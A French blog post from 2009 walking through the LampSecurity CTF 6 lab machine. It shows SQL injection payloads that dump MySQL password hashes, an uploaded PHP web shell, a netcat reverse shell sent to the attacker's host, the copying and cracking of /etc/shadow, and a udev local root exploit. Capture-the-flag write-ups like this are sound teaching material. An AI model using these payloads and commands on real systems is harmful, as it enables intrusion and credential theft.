---
layout: post
title:  "LampSecurity CTF 6"
date:   2009-07-28 20:18:00 +0100
categories: [security]
---
Je me suis attaqué à l'épreuve proposée par [lampsecurity](https://web.archive.org/web/20130510094426/http://www.lampsecurity.org/), le principe est de faire tourner une machine virtuelle et de la rooter. Si le challenge vous intéresse c'est [ici](http://www.lampsecurity.org/capture-the-flag-6). Il y a aussi une solution en pdf. Je propose une autre solution ici, si vous n'avez pas fait l'épreuve essayé là avant de lire ce qui suit.

Pour l’installation de l’épreuve j’ai utilisé `VMware player 2.5.2 build-156735`  
Pour la mise en place, la carte réseau virtuel est en mode bridged (`Devices->Network adapteur->Bridged`) ensuite il suffit de lancer la machine et c’est parti. Le mode bridged induit le fait que la machine sera sur le réseau local. Comme je travail sous windows, je commence par un:

```
ipconfig /all
Masque de sous-réseau . . . . . . : 255.255.255.0
Passerelle par défaut . . . . . . : 192.168.1.1
Serveur DHCP. . . . . . . . . . . : 192.168.1.1
```

Ensuite on lance [Nmap](nmap.org) pour localiser la machine:

```
nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 192.168.1.0/24
```

Chez moi son ip est `192.168.1.114`. Puis je scan les ports:

```
nmap -p 1-65535 -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 192.168.1.114
```

Étant une épreuve ciblée sur apache & co le seul port ouvert est le port 80/http.
On se rend sur le site web et après quelques tests on se rend compte que le site est criblé de failles: upload, sql injection, etc.
`http://192.168.1.114/index.php?id=1 OR 1=1` affiche tout les évents.

Ensuite on essaye de comprendre comment est structuré la requête. On peut interagir avec 3 champs, apparemment `2,3,7`, pour récupérer des informations.  
`?id=1 UNION SELECT 1,user(),database(),4,5,6,@@VERSION` se qui nous donne:
* user: cms_user@localhost
* Version du serv sql : 5.0.45
* Table utilisé: cms

Ensuite je me suis intéressé à la base `information_schema` pour avoir une vu global de la base de donnée.
Par exemple `?id=1 UNION SELECT 1,2,3,4,5,6,SCHEMA_NAME from information_schema.schemata` nous indique que la base de donné ressemble à ça:
* information_schema
* cms
* mysql
* roundcube
* test

```
?id=1 UNION SELECT 1,Host,User,4,5,6,Password from mysql.user
root@localhost : 6cbbdf9b35eb7db1 -> mysqlpass
cms_user@% : 2e0cfd856355b099 -> 45kkald?8laLKD
```

On peut aussi scanner les répertoires du site où on trouve le fichier `http://192.168.1.114/sql/db.sql` d'où on récupère des infos sur la table `cms.user`, ce qui nous donne le pass admin du site. (on remarquera au passage qu'il y a des sessions stoquées dans la BDD...).

admin : 25e4ee4e9229397b6b17776bfceaf8e7 -> adminpass  
On se log donc et on profite de l'upload d'image non filtré. les images sont stoquées dans `files/`. Hop on upload un script php avec un `system($cmd)`. On en a fini pour la partie web, le plus intéressant arrive:

```
uname -a
Linux 2.6.18-92.el5 #1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/var/www:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
fred:x:502:502::/home/john:/bin/bash
```

On ne peut pas se loger avec apache, ni utiliser `passwd` pour nous créer un compte ssh. J'upload un netcat compilé sur une autre box vu que le script d'upload filtre rien, c'est la solution la plus simple a mon gout.

```
Coté attaquant  : C:\\>nc -v -l -p 2501
Coté victime    : ?cmd=./netcat -e /bin/sh 192.168.1.111 2501
```

On a un shell, il nous reste plus qu'a élever nos privilèges sur la cible. La faille vmsplice ne donne rien, [udev](http://www.milw0rm.com/exploits/8478) par contre... L’exploitation est un peu complexe, J'ai eu recours à la solution proposé par lampsec. En gros le sploit a besoin d'un pid qu'on ne peut pas retrouver précisément. On se base sur ça:

```
cat /proc/net/netlink
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
cfc43c00 0   3153   00000111 0        0        00000000 2
cfecce00 0   0      00000000 0        0        00000000 2
cf5f8000 6   0      00000000 0        0        00000000 2
cf54b800 7   0      00000000 0        0        00000000 2
ce733e00 9   2467   00000000 0        0        00000000 2
cfe4f000 9   0      00000000 0        0        00000000 2
cfe46c00 10  0      00000000 0        0        00000000 2
cfbecc00 11  0      00000000 0        0        00000000 2
cfc43a00 15  571    ffffffff 0        0        00000000 2 <-- ici
cfeccc00 15  0      00000000 0        0        00000000 2
cfbeca00 16  0      00000000 0        0        00000000 2
cfcf0200 18  0      00000000 0        0        00000000 2
```

Le pid utilisé dans l'exploit devrai être `571-1`, en réalité ça a fonctionné avec le pid `573` donc n'hésitez pas à faire plusieurs test... J'ai modifié le script de la faille udev car nous n'avons pas de shell interactif, juste une connexion avec netcat. J’ai donc copié les fichiers `/etc/shadow` & `/etc/passwd` avec les droits de lecture pour apache. Ensuite on crack les pass obtenus à l’aide de [John the ripper](http://www.openwall.com/john/) ce qui donne un résultat assez rapidement.  
fred : fred1989

On peut donc maintenant se loger en ssh et profiter d’un vrai shell, on relance le sploit udev en le modifiant encore pour ne pas avoir d'erreur d'acces en écriture/lecture (celui si utilise des liens hardcodés donc `/tmp/suid` est inaccessible. On modifie donc `/tmp/suid` par `/tmp/suidBis`). On relance le sploit modifié avec cette fois si un `execl(“/bin/sh”, “sh”, NULL);` et on obtient notre shell avec les droits root!

Il y a surement d’autres solutions, comme au niveau de roundcube ou des sessions!
